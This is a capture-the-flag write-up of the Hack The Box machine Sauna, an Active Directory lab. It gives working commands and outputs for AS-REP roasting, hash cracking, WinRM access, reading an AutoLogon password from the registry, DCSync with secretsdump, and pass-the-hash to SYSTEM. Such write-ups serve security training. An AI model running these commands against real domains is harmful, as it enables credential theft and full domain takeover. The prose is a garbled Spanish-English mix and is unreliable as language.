# Sauna — Final Didactic Technical Writeup (Expanded Version)

## 1. Introduction

**Sauna** is a retired Windows machine from Hack The Box, classified as *Easy*, but with a training value far greater than that label suggests. The observed resolution in this case does not depend on one spectacular vulnerability, but on an **Active Directory compromise chain** built step by step from real evidence: public information exposed on the website, identity derivation, Kerberos abuse, reuse of credentials found during internal enumeration and, finally, exploitation of delegated domain permissions until full compromise of the domain controller.

What makes Sauna especially good for study is that it forces several important ideas to be practised at the same time:

- how to distinguish between **visible surface** and **dominant surface**;
- how to turn an apparently harmless corporate website into **useful intelligence for Active Directory**;
- how to correctly interpret an **AS-REP roastable user**;
- how to read an account that looks modest locally, but has **much more domain weight** than it appears to have.

This document faithfully reconstructs the real resolution observed in the case notes. It does not redo the machine with an alternative route or fill gaps with imagination. When an interpretation appears, it is presented as an interpretation; when something was directly observed, it is presented as a verified fact.

---

## 2. Reading guide

The document is organized as a chronological technical narrative. Each phase keeps two clearly differentiated levels:

1. **what was actually observed**, that is, executed commands, obtained outputs and decisions made from evidence;
2. **the didactic reading**, which explains why that step was taken, what previous signal justified it, which part of the output really mattered and how it changed the next decision.

The idea is not to build a simple command history, but reusable material for later study.

---

## 3. Target preparation and reconnaissance startup

The machine starts with the usual laboratory workflow through the tool `Inici-HTB`, which sets the target, prepares the base directory, validates connectivity and launches the first scans.

### Startup command

```bash
Inici-HTB SAUNA 10.129.95.180
```

### What this startup aimed to achieve

This was not just about “seeing ports”. The initial startup had several concrete purposes:

- confirm that the target was alive;
- obtain an initial estimate of the operating system;
- build a complete snapshot of the TCP surface;
- identify services and versions with as little guesswork as possible.

### Relevant output

```text
PING 10.129.95.180 ... ttl=127
10.129.95.180 (ttl -> 127): Windows
```

```text
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

AND in the escaneo of services:

```text
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home

389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0.)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
Host: SAUNA
smb2-security-mode: Message signing enabled and required
clock-skew: 6h59m59s
```

### Technical interpretation

Here the important point is not “Windows with muchos puertos”, but **the exact combination** of services. DNS + Kerberos + LDAP + SMB + Global Catalog + WinRM + ADWS do not describe just any Windows host: they strongly describe a **domain controller**.

That nuance is crucial because it changes the entire strategy. In lugar of open several branches a the vez —web, SMB, WinRM, LDAP— it is better to first ask what evidence can help a **build valid identities**, understand domain authentication and find an entry point with the least possible noise.

### Phase closure

The phase initial dejó cuatro facts important already fijados:

- the objective was Windows;
- su huella encajaba with a **DC**;
- the web corporate and the domain parecían pertenecer to the same context organizativo;
- the `clock skew` was large and debía quedar anotado for phases posteriores with Kerberos.

---

## 4. Identification of the dominant surface

A primera vista there was a web accesible in `80/tcp`, and could haber sido tentador tratarla as a aplicación vulnerable classic. Without embargo, the reading correct was distinta.

### Verified fact

The web devolvía the título:

```text
Egotistical Bank :: Home
```

and the domain LDAP identificado was:

```text
EGOTISTICAL-BANK.LOCAL
```

### Why this relationship mattered

Because une the public website with the domain internal. That not demuestra vulnerability web, but yes revela something quizá more useful in this phase: the web probablemente pertenece a the same organización that Active Directory and, by tanto, can exponer **real names**, cargos, structure internal or pistas of naming.

### Didactic reading

In a environment AD, a web corporate can have much value incluso without presentar a sola vulnerability technical visible. A veces the primer salto not sale of “romper” the aplicación, but rather of **leerla as source of intelligence**.

By that the surface dominant not  trató as “WEB-BASIS” in sentido classic, but rather as:

**AD enum apoyada by intelligence public from the web.**

---

## 5. Name extraction from `about.html`

With that hipótesis, the next step was mínimo and of very low noise: check si the web exponía names of people reutilizables.

### Commands used

```bash
curl -s http://10.129.95.180/about.html -o about.html
grep -Eoi '[A-Z][a-z]+ [A-Z][a-z]+' about.html | sort -u
```

### What was expected

Not  was looking for a vulnerability.  was looking for something much more specific:

- names completos plausible;
- idealmente in a sección tipo *team*, *about us* or similar;
- suficientes for derivar users of the domain.

### What the output returned

The expresión regular returned muchísimo noise of plantilla HTML, CSS and textos decorativos, but between toda that output aparecieron clearly seis names human plausible:

- `Fergus Smith`
- `Bowie Taylor`
- `Hugo Bear`
- `Shaun Coins`
- `Sophie Driver`
- `Steven Kerb`

### Interpretation

This point is important because convierte a intuición in a Verified fact: the public website **yes exponía identities** useful for Active Directory.

The decision correct a basis of ahí not was jump a LDAP or SMB, but rather consolidar esos names in a artefacto clean of trabajo.

### Reusable lesson

A public website in a laboratorio AD can not be the puerta of entrada technical, but yes a **basis of datos of names human**. AND that, in ciertos escenarios, vale more that a vulnerability noisy mal interpretada.

---

## 6. Consolidation of observed identities

For evitar that the noise of `grep` contaminara the next phase, the real names  pasaron a file clean.

### Command used

```bash
printf '%s\n' \
'Fergus Smith' \
'Bowie Taylor' \
'Hugo Bear' \
'Shaun Coins' \
'Sophie Driver' \
'Steven Kerb' > fullnames.txt
```

Verification:

```bash
cat fullnames.txt
```

### Observed result

```text
Fergus Smith
Bowie Taylor
Hugo Bear
Shaun Coins
Sophie Driver
Steven Kerb
```

and the ubicación was left correctly fijada in:

```text
/home/r4mon/pentest/targets/HTB/easy/SAUNA/content/users/fullnames.txt
```

### Why this step has real value

Because separa **signal** of **noise** and convierte a observation in a artefacto operational reusable. That distinción importa much in writeups didácticos: a cosa is “ vieron names in a web”, and otra better is “was left a list clean, trazable and list for derivation of accounts”.

---

## 7. From real names to user candidates

A vez obtained the names, the next step not was probar access a ciegas, but rather build a list reasonable of accounts posibles.

### First broad derivation

 generated a primera list `usernames.txt` with múltiples patrones habituales:

- `nombre`
- `apellido`
- `nombre.apellido`
- `nombreapellido`
- `nombre_apellido`
- `inicialapellido`
- and algunas variantes less sólidas

### Block used

```bash
python3 - <<'PY'
from pathlib import Path

src = Path("fullnames.txt")
dst = Path("usernames.txt")

seen = set()
order = []

for line in src.read_text(encoding="utf-8").splitlines():
    name = line.strip()
    if not name:
        continue
    parts = name.lower().split()
    if len(parts) < 2:
        continue

    first = parts[0]
    last = parts[-1]

    candidates = [
        first,
        last,
        f"{first}.{last}",
        f"{first}{last}",
        f"{first}_{last}",
        f"{first[0]}{last}",
        f"{first}{last[0]}",
        f"{first[0]}.{last}",
        f"{last}.{first}",
        f"{last}{first[0]}",
    ]

    for candidate in candidates:
        if candidate not in seen:
            seen.add(candidate)
            order.append(candidate)

dst.write_text("\n".join(order) + "\n", encoding="utf-8")
print(f"[+] Guardados {len(order)} candidatos en {dst}")
PY
```

### Useful output

```text
[+] Guardados 60 candidatos en usernames.txt
fergus
smith
fergus.smith
fergussmith
fergus_smith
fsmith
...
```

### What was learned from that output

The generación funcionó, but mezcló candidates strong with variantes bastante flojas. That is a point methodological important: a list more long not siempre is a list better.

### Second derivation: prioritized list

By that  generated afterwards `usernames_priority.txt`, conservando only cuatro patrones of more value initial:

- `nombre.apellido`
- `nombreapellido`
- `nombre_apellido`
- `inicialapellido`

### Block used

```bash
python3 - <<'PY'
from pathlib import Path

src = Path("fullnames.txt")
dst = Path("usernames_priority.txt")

seen = set()
order = []

for line in src.read_text(encoding="utf-8").splitlines():
    name = line.strip()
    if not name:
        continue
    parts = name.lower().split()
    if len(parts) < 2:
        continue

    first = parts[0]
    last = parts[-1]

    candidates = [
        f"{first}.{last}",
        f"{first}{last}",
        f"{first}_{last}",
        f"{first[0]}{last}",
    ]

    for candidate in candidates:
        if candidate not in seen:
            seen.add(candidate)
            order.append(candidate)

dst.write_text("\n".join(order) + "\n", encoding="utf-8")
print(f"[+] Guardados {len(order)} candidatos prioritarios en {dst}")
PY
```

### Relevant output

```text
fergus.smith
fergussmith
fergus_smith
fsmith
bowie.taylor
bowietaylor
bowie_taylor
btaylor
...
```

### Technical interpretation

This phase cierra very bien a idea important: in Active Directory not siempre gana quien genera more variantes, but rather quien genera variantes **better priorizadas** and sabe justificar by what empieza by unas and not by otras.

---

## 8. Before Kerberos: clock-skew correction

The enumeration initial already there was left a alerta very seria:

```text
clock-skew: 6h59m59s
```

Before of use Kerberos, that debía corregirse.

### Commands used

```bash
date -u
sudo ntpdate -q 10.129.95.180
sudo ntpdate -u 10.129.95.180
date -u
```

### Relevant output

```text
2026-04-23 20:44:15.93361 (+0200) +25202.319033 +/- 0.024418 10.129.95.180 s1 no-leap
CLOCK: time stepped by 25202.317982
```

### What that output meant

The diferencia was of unas **siete horas**. Not was a detalle cosmético. Was a problema sufficiently large as for contaminar by completo cualquier reading later of Kerberos.

### Why this step was mandatory

Kerberos depends of the time. Si the clock is roto, a technical can parecer fallida by a motivo completamente distinto of the that  is interpretando.

### Reusable lesson

A good list of users can quedar inutilizada by a clock desalineado. Before of declarar muerta path Kerberos, it is advisable asegurarse of that the time not is saboteando the reading.

---

## 9. Identity validation through ASREPRoasting

With the time corregida and the prioritized list preparada, the next step was check si alguno of the candidates devolvía answer useful in Kerberos without password.

### Command used

```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile usernames_priority.txt -no-pass -dc-ip 10.129.95.180
```

### What this command was looking for

Not autenticaba users with passwords. What that hacía was preguntar to the KDC si algunan account had **Kerberos pre-authentication deshabilitada**, permitiendo así obtain a AS-REP roastable.

### Observed output

The mayoría of candidates devolvieron:

```text
KDC_ERR_C_PRINCIPAL_UNKNOWN
```

But uno returned something completamente distinto:

```text
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...
```

### What was demonstrated here

This point valida of golpe several decisions anteriores:

1. the web yes aportó names useful;
2. the derivation of users not was arbitraria;
3. the convention `inicial + apellido` funcionó;
4. the account `fsmith` was real;
5. also, was **AS-REP roastable**.

### Implication for the next phase

From here already not had sentido seguir ampliando lists of users or probar SMB/LDAP by inercia. The evidence dominant was much better: a hash Kerberos explotable offline.

---

## 10. Hash preservation and offline work

Before of cualquier cracking, the hash  guardó in a file clean.

### Block used

```bash
cat > asrep_fsmith.txt <<'EOF'
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:655d7bbbf26151b21bd1ee464be5be3c$1cc708ac52f286125fd08352f6102f10e3bb5bc62d5afb1bc146b1c05e60fbe0e9c0add9748c23d6aba8b066fcab139b2703b87997b9c04961704371a39585722c3deef03c9ff20676130cd2aa130d6ff005ae008f70ec9fe46f5eeee064218fa9338ca8ac265ff8a2a50133b8615d119624116b317bd85e8e91632e3a00f6ca2921b20d1d3803754a3326c17004c66c0c90be9426566bbe93e3c44aa633695a2b18248d4f30034d6cede5fadad9556394056a83a254bef2c0b88e76f5b852a4212583793817a79d1b234993cc606c7eb21ca344e912c7077fd431ecaae2be42bdcf713e790085cccf5bcc283324bc7d20a490178dc5e47339d7bb0c6b929158
EOF

wc -l asrep_fsmith.txt
cat asrep_fsmith.txt
```

### Verification

`wc -l` returned `1`, what that confirmed that the artefacto useful estaba aislado in a sola línea and without noise.

### Why it matters to document it

Because in a case así the hash already not is only a output of tool: moves a be a **artefacto central of the investigación**.

---

## 11. Offline password recovery of `fsmith`

### Command used

```bash
hashcat -m 18200 asrep_fsmith.txt /usr/share/wordlists/rockyou.txt -O --outfile cracked_fsmith.txt
cat cracked_fsmith.txt
```

### What exactly does `-m 18200`

That modo corresponde a:

- `Kerberos 5, etype 23, AS-REP`

Is that is, the formato exacto of the material obtenido with `GetNPUsers.py`.

### Observed result

Hashcat resolvió the password with `rockyou.txt`:

```text
...:Thestrokes23
```

### Recovered credential

- user: `fsmith`
- password: `Thestrokes23`

### What changes from here

Until this point the path there was sido:

- names → users plausible → account real → hash AS-REP

Now the chain da salto cualitativo: already exists a **complete credential** and reusable.

The next step correct already not is “seguir abusando of Kerberos”, but rather check in what surface exposed that credential has value operational real.

---

## 12. Initial access through WinRM as `fsmith`

WinRM already estaba exposed from the phase of enumeration initial, así that was the opción more clean for validate the value práctico of the credential.

### Command used

```bash
evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'
```

### What was expected

- or a remote shell válida;
- or a fallo of autorización that obligara reinterpretar the alcance of the account.

### Observed result

```text
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

### Verified fact

The credential not only was válida in abstracto, but rather **operational** in a service real of the system.

### Didactic reading

This is the primer gran pivote of the case. The problema leaves of be “encontrar a debilidad of autenticación” and moves a be “enumerar correctly a foothold already conseguido”.

---

## 13. Initial internal enumeration after the foothold

A vez dentro as `fsmith`, the decision correct not was jump a tools pesadas, but rather fijar context.

### Commands used

```powershell
whoami
whoami /groups
hostname
ipconfig /all
systeminfo
echo $env:USERDOMAIN
echo $env:COMPUTERNAME
dir C:\Users
type C:\Users\FSmith\Desktop\user.txt
```

### Summarized key output

```text
whoami
egotisticalbank\fsmith
```

```text
BUILTIN\Remote Management Users
BUILTIN\Users
BUILTIN\Pre-Windows 2000 Compatible Access
```

```text
hostname
SAUNA
```

```text
echo $env:USERDOMAIN
EGOTISTICALBANK
```

```text
dir C:\Users
Administrator
FSmith
Public
svc_loanmgr
```

```text
type C:\Users\FSmith\Desktop\user.txt
c06623afb7a5c08a412d732234887383
```

### What really mattered in this output

- `fsmith` had remote access, but not parecía administrator;
- the flag of user already was legible;
- and, on todo, existía profile local of **`svc_loanmgr`**.

### Why that profile changed the direction of the case

Because sugería the presencia of otran account with more value potencial that `fsmith`. AND in Windows, when a service account leaves rastro local, merece the pena preguntarse si the system expone credentials or configuración asociadas a ella.

---

## 14. AutoLogon in the registry: the segunda credential

### Command used

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### What was being searched for

The parámetros típicos of AutoLogon:

- `DefaultDomainName`
- `DefaultUserName`
- `DefaultPassword`

### Relevant output

```text
DefaultDomainName    REG_SZ    EGOTISTICALBANK
DefaultUserName      REG_SZ    EGOTISTICALBANK\svc_loanmanager
DefaultPassword      REG_SZ    Moneymakestheworldgoround!
```

### What was demonstrated

The system almacenaba cleartext password in the registry. That already not was a inference nor a conjetura: was a secreto reusable observed directly in the host.

### The important discrepancy

Here appeared a matiz very fino, but decisivo:

- in `C:\Users`  there was visto `svc_loanmgr`;
- in `Winlogon` aparecía `svc_loanmanager`.

Before of reutilizar the credential, tocaba resolver cuál was the name real of the account.

### Reusable lesson

When a system expone a cleartext password, the tentación natural is probarla inmediatamente. The problema is that si the identificador of the user is mal interpretado, a credential perfectamente good can parecer inútil.

---

## 15. Resolution of the user discrepancy

### Commands used

```powershell
net user svc_loanmgr
net user svc_loanmanager
```

### Observed result

`svc_loanmgr` yes existía and devolvía information of account. `svc_loanmanager` not existía.

Also, `svc_loanmgr` pertenecía a:

- `Domain Users`
- `Remote Management Users`

### Interpretation

The discrepancia was left resuelta. The password observed in AutoLogon seguía siendo válida as secreto exposed, but the name of user operational correct was:

- `svc_loanmgr`

### Implicación

That permitía intentar a nuevo remote access with very good basis:

- name real verified;
- password observed in clear;
- pertenencia `Remote Management Users`.

---

## 16. Context switch a `svc_loanmgr`

### Command used

```bash
evil-winrm -i 10.129.95.180 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

### Observed result

```text
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>
```

### What significó this step

Until that momento, `fsmith` there was sido the puerta of entrada. A basis of here, the account main of trabajo moved a be `svc_loanmgr`.

AND here appears a idea very important in AD: an account can parecer modest from fuera, but have a weight enorme in the domain.

---

## 17. Measuring the real value of `svc_loanmgr`

The next step was confirm what groups and privileges had really this nuevan account.

### First operational stumble

 executed by error:

```powershell
whoami / groups
whoami / priv
```

and that returned a error sintáctico:

```text
ERROR: Invalid argument/option - '/'
```

### Correction

The forma correct was:

```powershell
whoami
whoami /groups
whoami /priv
```

### Observed output

Groups:

```text
BUILTIN\Remote Management Users
BUILTIN\Users
BUILTIN\Pre-Windows 2000 Compatible Access
...
```

Privileges:

```text
SeMachineAccountPrivilege     Enabled
SeChangeNotifyPrivilege       Enabled
SeIncreaseWorkingSetPrivilege Enabled
```

### What this output taught

AND this is uno of the grandes points didácticos of Sauna:

- `svc_loanmgr` **not** destacaba by privileges local potentes;
- not aparecían groups administrativos local;
- not saltaban privileges clásicos as `SeImpersonatePrivilege`.

That obligaba cambiar the question. The value of this account not parecía estar in the host local, but rather probablemente in the **domain**.

### Reusable lesson

When an account not destaca nor by groups local nor by privileges of the token, not it is advisable descartarla too much rápido. In Active Directory, muchas accounts apparently discretas esconden su value in **ACLs, delegaciones and rights on objects of the domain**.

---

## 18. Active Directory collection with `bloodhound-python`

With that reading, the next decision was correct: recoger information of AD from fuera for understand what podía do `svc_loanmgr` in the domain.

### Commands used

```bash
cd /home/r4mon/pentest/targets/HTB/easy/SAUNA/content
bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All
zip bloodhound_sauna.zip *.json
ls -l *.json bloodhound_sauna.zip
```

### Relevant output

```text
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: egotistical-bank.local
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication.
INFO: Found 1 domains
INFO: Found 1 computers
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
```

### What was learned here

The collection was válida and produjo several JSON and a ZIP listo for importar. The detalle of the fallo initial of the TGT not was the dato central, because the tool did *fallback* a NTLM and completó the recogida.

### The real problem came later

The part local of analysis visual was left bloqueada by several tropiezos of the attacker environment:

- arranque of Neo4j as part of the setup;
- primera ejecución of BloodHound with componentes CE;
- mezcla between collection `LEGACY` and stack `CE`;
- problemas of navegador to the lanzarlo as root;
- `bhapi.json` roto by a carácter sobrante;
- and, finally, a fallo of migración SQL.

### Why it is worth documenting

Because enseña lección methodological important: a tool local can atascarse **without that the exploitation esté mal encaminada**. The problema can estar in the viewer, not in the chain of attack.

---

## 19. Correct methodological decision ante the atasco of BloodHound

The investigación not  detuvo a pelear indefinidamente with the viewer local. AND that was a decision very good.

### Reasoning

A esas alturas already there was sufficient evidence for sostener a hipótesis strong:

- `svc_loanmgr` not destacaba locally;
- by tanto, what more reasonable was that su value estuviera in domain;
- si that was cierto, debía poder comprobarse directly.

### The right question became

**¿Has `svc_loanmgr` permissions of replicación on the domain?**

---

## 20. Direct DCSync verification

### Command used

```bash
impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180' -just-dc-user Administrator
```

### What this command was looking for

Not  trataba of a volcado masivo. The opción `-just-dc-user Administrator` restringía the prueba a comprobación very specific: verify si the account had rights suficientes for extraer the material of the administrator of the domain.

### Observed result

```text
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
```

### What was demonstrated

Esto cerró the duda more important of the case:

- `svc_loanmgr` had capacidad efectiva of **DCSync**.

That is the momento in the that the account leaves of be “interesante” and moves a be **crítica**.

### Implicación

Already not hacía falta seguir enumerando ACLs or arreglar BloodHound for saber si the account had value. The demostración práctica already estaba hecha.

---

## 21. Pass-the-Hash against `Administrator`

With the NTLM hash of the `Administrator` in the mano, the next step was directo and coherente.

### Command used

```bash
psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

### What was expected

A autenticación Pass-the-Hash exitosa and a remote shell with privileges máximos in the DC.

### Observed result

```text
[*] Found writable share ADMIN$
[*] Uploading file ...
[*] Creating service ...
[*] Starting service ...
Microsoft Windows [Version 10.0.17763.973]
C:\Windows\system32>
```

### Interpretation

The hash of the `Administrator` was plenamente reusable. In that point, the case already estaba prácticamente closed. Only faltaba do the Verification mínima of identity and reading of the final flag.

---

## 22. Final verification of full control

### Commands used

```cmd
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

### Observed output

```text
nt authority\system
SAUNA
2ebc5339eff500834123056f79cad936
```

### Verified facts

- the context final was `SYSTEM`;
- the host was `SAUNA`;
- the `root.txt` was accesible.

With that was left confirmado the full compromise of the domain controller.

---

## 23. Complete technical chain summarized

The resolution real observed in Sauna was this:

1. Enumeration initial with huella clear of DC Windows.
2. Interpretation of the web as source of intelligence and not as path main of exploitation.
3. Name extraction real from `about.html`.
4. Creation of `fullnames.txt`.
5. Derivation of candidate users and priorización of conventions plausible.
6. Correction of the `clock skew` before of touch Kerberos.
7. ASREPRoasting exitoso on `fsmith`.
8. Preservación of the hash and recovery offline of `Thestrokes23`.
9. remote access by WinRM as `fsmith`.
10. Enumeration internal and detección of the profile `svc_loanmgr`.
11. Consulta of the registry and hallazgo of AutoLogon with cleartext password.
12. Resolution of the discrepancia `svc_loanmanager` / `svc_loanmgr`.
13. remote access by WinRM as `svc_loanmgr`.
14. Comprobación of that the value real of the account not estaba in the host, but rather in the domain.
15. Collection of AD with `bloodhound-python`.
16. Atasco local of the viewer BloodHound and reevaluación methodological correct.
17. Validación directa of DCSync with `secretsdump`.
18. Extracción of the NTLM hash of `Administrator`.
19. Pass-the-Hash with `psexec.py`.
20. Shell final as `SYSTEM` and reading of the `root.txt`.

---

## 24. Reusable lessons

### The public website can be a source of identity, not a surface dominant of exploitation

Not toda web has that romperse. Algunas simplemente **alimentan better that ninguna otra phase** the construcción of identities válidas in AD.

### The naming of users  must trabajar as a artefacto, not as improvisación

Move of real names a `fullnames.txt`, then a `usernames.txt` and finally a `usernames_priority.txt` not was burocracia: was a manera ordenada of elevar the calidad of the next validación.

### Kerberos without time correct engaña

The `clock skew` of siete horas habría fact very fácil interpret mal the phase of Kerberos. Correct the time was a precondición, not a comodidad.

### A user AS-REP roastable cambia of verdad the case

When an account returns a AS-REP hash, the prioridad leaves of be ampliar lists of names and moves a be preservar that artefacto and trabajarlo offline.

### A foothold initial not siempre is the user important of the case

`fsmith` was sufficient for entrar, but not for close the machine. Su verdadero value estuvo in permitir descubrir something better.

### The registry of Windows sigue siendo a source of secretos brutal

`Winlogon` entregó a cleartext password. That mala práctica convirtió a enumeration post-foothold apparently simple in a pivote decisivo.

### The weight real of an account can estar in the domain, not in sus groups local

That is quizá the aprendizaje more strong of Sauna. `svc_loanmgr` not impresionaba locally. But su impacto real estaba in Active Directory.

### When the viewer falla, the chain not has by what estar rota

The atasco with BloodHound enseñó very bien a distinguish between:
- a problema of the objective;
- and a problema of the attacker environment.

AND that distinción ahorra muchísimo time.

---

## 25. Editorial note on this final version

This versión amplía of forma clear the desarrollo of the case respecto a the versión anterior. The objective has sido preserve **the riqueza didactic of the notes**, but quitando the sensación mecánica that producía repetir in each microfase the mismas etiquetas of “objective”, “Verified facts”, “assumptions”, “method”, “answer”, “commands”, “checks” and “notes”.

That information not  has removed.  has **reintegrado** dentro of a narrativa technical more natural and more legible, manteniendo the trazabilidad of the case real.

### Corrections applied to the original notes

Not  have fact correcciones destructivas on the contenido technical original. Only  have asumido tres tipos of normalización editorial:

1. **orden and maquetación** of the cuerpo main;
2. **integración narrativa** of contenido repetitivo;
3. **reading explícita of pequeños errores operativos** already presentes in the own notes, by ejemplo:
   - the sintaxis incorrecta `whoami / groups` and `whoami / priv`;
   - the discrepancia between `svc_loanmanager` and `svc_loanmgr`;
   - the atasco local with BloodHound CE frente a collection Legacy.

Not  has invented a path nueva nor  has reescrito the machine as si  hubiera resuelto of otro modo.

---

## 26. Traceability appendix — complete original notes

> The following section preserves the complete original notes as a traceability block. Not steps have been removed, pivotes nor outputs relevant. The main body of this document is the consolidated didactic version; what follows preserves the original operational history.

---

### We start the exploitation of the machine Sauna of Hack The Box.

### Machine summary:

Sauna is a machine Windows of dificultad Easy and also is retired in HTB. HTB the describe as a machine centrada in enumeration and exploitation of Active Directory, publicada originalmente the 15/02/2020.

Technical summary – Sauna

Sauna is a machine oriented a chain classic of compromise in environment Windows/Active Directory. The resolution part of a phase of enumeration on information exposed by the organización, continúa with the construcción of identities válidas dentro of the domain and evoluciona hacia técnicas of abuse of autenticación Kerberos for obtain credentials reutilizables. A basis of that access initial, the machine forces a profundizar in the enumeration internal of the system and of the privileges delegated in the domain, until enlazar a path of escalada that culminates in full compromise of the domain controller. In términos formativos, is a machine very useful for practice metodología AD, correlación of evidence, uso of tools of reconocimiento of domain and comprensión of cadenas of attack basadas in permissions mal asignados.

Real technical value

Very good for aprender flujo básico of AD enum → Kerberos abuse → remote access → analysis of privileges → DCSync.
Although HTB the marca as Easy, is a easy of much value pedagógico si quieres empezar a understand Windows/AD of forma seria.

### Iniciamos with nuestro programa Inici_HTB, that nos ayuda organizar the information of each machine and a ejecutar the primeros steps of reconocimiento.

❯ Inici-HTB SAUNA 10.129.95.180
[*] Fijando objetivo en Polybar con settarget
[*] Preparando directorio base
[*] Comprobando conectividad inicial
PING 10.129.95.180 (10.129.95.180) 56(84) bytes of data.
64 bytes from 10.129.95.180: icmp_seq=1 ttl=127 time=50.0 ms

--- 10.129.95.180 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 50.026/50.026/50.026/0.000 ms
[*] Intentando identificación rápida con whichSystem.py

10.129.95.180 (ttl -> 127): Windows

[*] Lanzando escaneo completo de puertos
[sudo] password for r4mon:
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-23 12:55 CEST
Initiating SYN Stealth Scan at 12:55
Scanning 10.129.95.180 [65535 ports]
Discovered open port 80/tcp on 10.129.95.180
Discovered open port 135/tcp on 10.129.95.180
Discovered open port 139/tcp on 10.129.95.180
Discovered open port 445/tcp on 10.129.95.180
Discovered open port 53/tcp on 10.129.95.180
Discovered open port 88/tcp on 10.129.95.180
Discovered open port 49676/tcp on 10.129.95.180
Discovered open port 49674/tcp on 10.129.95.180
Discovered open port 5985/tcp on 10.129.95.180
Discovered open port 49688/tcp on 10.129.95.180
Discovered open port 593/tcp on 10.129.95.180
Discovered open port 49696/tcp on 10.129.95.180
Discovered open port 3269/tcp on 10.129.95.180
Discovered open port 9389/tcp on 10.129.95.180
Discovered open port 389/tcp on 10.129.95.180
Discovered open port 49668/tcp on 10.129.95.180
Discovered open port 3268/tcp on 10.129.95.180
Discovered open port 636/tcp on 10.129.95.180
Discovered open port 464/tcp on 10.129.95.180
Discovered open port 49673/tcp on 10.129.95.180
Completed SYN Stealth Scan at 12:55, 26.35s elapsed (65535 total ports)
Nmap scan report for 10.129.95.180
Host is up, received user-set (0.047s latency).
Scanned at 2026-04-23 12:55:09 CEST for 26s
Not shown: 65515 filtered tcp ports (not-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  Kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  LDAP             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49688/tcp open  unknown          syn-ack ttl 127
49696/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds
           Raw packets sent: 131063 (5.767MB) | Rcvd: 33 (1.452KB)
[*] Extrayendo puertos abiertos
[*] Puertos abiertos detectados: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49676,49688,49696
[*] Lanzando escaneo de servicios
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-23 12:55 CEST
Nmap scan report for 10.129.95.180
Host is up (0.047s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  Kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-23 17:55:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  LDAP          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  LDAP          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
